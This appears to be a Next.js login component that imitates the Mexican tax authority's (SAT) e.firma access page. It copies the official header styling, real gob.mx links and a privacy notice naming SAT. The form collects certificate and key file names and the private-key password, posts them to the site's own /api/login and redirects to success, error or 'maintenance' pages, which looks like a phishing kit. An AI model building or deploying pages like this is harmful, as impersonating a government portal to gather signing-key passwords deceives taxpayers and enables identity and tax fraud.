"use client";

import React, { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import Swal from "sweetalert2";

const AutenticacionSAT = () => {
  const router = useRouter();

  const fileCerRef = useRef(null);
  const fileKeyRef = useRef(null);

  const [certificatePath, setCertificatePath] = useState("");
  const [keyPath, setKeyPath] = useState("");
  const [privateKeyPassword, setPrivateKeyPassword] = useState("");
  const [rfc] = useState("XAXX010101000"); // RFC informativo
  const [error, setError] = useState("");

  const handleCerClick = () => {
    fileCerRef.current.click();
  };

  const handleKeyClick = () => {
    fileKeyRef.current.click();
  };

  const handleFileChange = (event, setter) => {
    const file = event.target.files[0];
    if (file) {
      setter(file.name);
    }
  };

  const handleSend = async () => {
    if (!certificatePath || !keyPath || !privateKeyPassword) {
      setError("¡Faltan campos por completar!");
      return;
    }

    Swal.fire({
      title: "Iniciando sesión...",
      text: "Por favor espera",
      allowOutsideClick: false,
      didOpen: () => {
        Swal.showLoading();
      },
    });

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          certificatePath,
          keyPath,
          privateKeyPassword,
          rfc,
        }),
      });

      const data = await res.json();
      console.log("body: ", data);
      console.log("status: ", res.status);

      if (res.status === 200) {
        Swal.close();
        router.push("/correcto");
      }
      if (res.status === 400) {
        Swal.close();
        router.push("/error");
      }
      if (res.status === 503) {
        Swal.close();
        router.push("/mantenimiento");
      }
    } catch (err) {
      Swal.fire({
        icon: "error",
        title: "Error de red",
        text: "Ocurrió un problema al conectar con el servidor.",
      });
    }
  };

  const handlePasswordLogin = () => {
    router.push("/contrasena");
  };

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header estilo SAT */}
      <header className="bg-[#60003b] text-white py-3 shadow">
        <div className="max-w-6xl mx-auto px-4 flex justify-between items-center">
          <h1 className="text-lg font-bold tracking-wide">
            GOBIERNO DE MÉXICO
          </h1>
          <nav className="space-x-4 text-sm">
            <a href="https://www.gob.mx/tramites" className="hover:underline">
              Trámites
            </a>
            <a href="https://www.gob.mx/gobierno" className="hover:underline">
              Gobierno
            </a>
            <a href="https://www.gob.mx/busqueda" className="hover:underline">
              Buscar
            </a>
          </nav>
        </div>
      </header>

      <main className="py-12 px-4">
        <div className="max-w-2xl mx-auto bg-white shadow-md rounded-lg p-8 text-gray-800">
          <h3 className="text-2xl font-semibold mb-6 text-gray-900">
            Acceso con e.firma
          </h3>

          {error && (
            <div className="text-red-700 bg-red-100 border border-red-400 rounded p-3 mb-4">
              {error}
            </div>
          )}

          <form method="post" onSubmit={(e) => e.preventDefault()}>
            {/* Certificado */}
            <div className="mb-4">
              <label
                htmlFor="txtCertificate"
                className="block font-semibold mb-1"
              >
                Certificado (.cer):
              </label>
              <div className="flex items-center gap-2">
                <input
                  id="txtCertificate"
                  name="txtCertificate"
                  type="text"
                  placeholder="Ubicación del certificado"
                  readOnly
                  value={certificatePath}
                  className="flex-1 border rounded px-3 py-2 w-full"
                />
                <button
                  type="button"
                  onClick={handleCerClick}
                  className="px-4 py-2 border rounded bg-gray-200"
                >
                  Buscar
                </button>
                <input
                  type="file"
                  ref={fileCerRef}
                  id="fileCertificate"
                  accept=".cer"
                  style={{ display: "none" }}
                  onChange={(e) => handleFileChange(e, setCertificatePath)}
                />
              </div>
            </div>

            {/* Clave privada */}
            <div className="mb-4">
              <label
                htmlFor="txtPrivateKey"
                className="block font-semibold mb-1"
              >
                Clave privada (.key):
              </label>
              <div className="flex items-center gap-2">
                <input
                  id="txtPrivateKey"
                  name="txtPrivateKey"
                  type="text"
                  placeholder="Ubicación de la llave privada"
                  readOnly
                  value={keyPath}
                  className="flex-1 border rounded px-3 py-2 w-full"
                />
                <button
                  type="button"
                  onClick={handleKeyClick}
                  className="px-4 py-2 border rounded bg-gray-200"
                >
                  Buscar
                </button>
                <input
                  type="file"
                  ref={fileKeyRef}
                  id="filePrivateKey"
                  accept=".key"
                  style={{ display: "none" }}
                  onChange={(e) => handleFileChange(e, setKeyPath)}
                />
              </div>
            </div>

            {/* Contraseña */}
            <div className="mb-4">
              <label
                htmlFor="privateKeyPassword"
                className="block font-semibold mb-1"
              >
                Contraseña de clave privada:
              </label>
              <input
                type="password"
                id="privateKeyPassword"
                name="privateKeyPassword"
                placeholder="Contraseña"
                value={privateKeyPassword}
                onChange={(e) => setPrivateKeyPassword(e.target.value)}
                className="w-full border rounded px-3 py-2"
              />
            </div>

            {/* RFC */}
            <div className="mb-6">
              <label htmlFor="rfc" className="block font-semibold mb-1">
                RFC:
              </label>
              <input
                type="text"
                id="rfc"
                name="rfc"
                value={rfc}
                disabled
                className="w-full border rounded px-3 py-2 bg-gray-100 text-gray-700"
              />
            </div>

            {/* Botones */}
            <div className="flex justify-end gap-2">
              <input
                type="button"
                id="contrasena"
                name="contrasena"
                value="Contraseña"
                onClick={handlePasswordLogin}
                className="px-4 py-2 border rounded bg-gray-200 text-gray-800 cursor-pointer"
              />
              <input
                type="button"
                id="submit"
                name="submit"
                value="Enviar"
                onClick={handleSend}
                className="px-4 py-2 border rounded bg-blue-600 text-white cursor-pointer"
              />
            </div>
          </form>

          {/* Aviso de privacidad */}
          <div className="bg-blue-50 border border-blue-200 text-blue-800 mt-10 p-5 rounded text-sm">
            <strong className="block mb-1 text-center">
              Aviso de privacidad simplificado
            </strong>
            <p className="text-center">
              El Servicio de Administración Tributaria, es el responsable del
              tratamiento de los datos personales que se recolectan a través de
              su portal de internet
              <a
                href="https://www.sat.gob.mx"
                target="_blank"
                rel="noreferrer"
                className="text-blue-600 underline ml-1"
              >
                (https://www.sat.gob.mx)
              </a>
              , los cuales son protegidos conforme a la Ley General de
              Protección de Datos Personales.
            </p>
            <p className="text-center mt-2">
              Más información:
              <a
                href="https://repositorio.cloudb.sat.gob.mx/FTP/avisoprivacidad/802_NV_aviso_integral.html"
                target="_blank"
                rel="noreferrer"
                className="text-blue-600 underline ml-1"
              >
                Aviso de privacidad integral
              </a>
            </p>
          </div>
        </div>
      </main>
    </div>
  );
};

export default AutenticacionSAT;
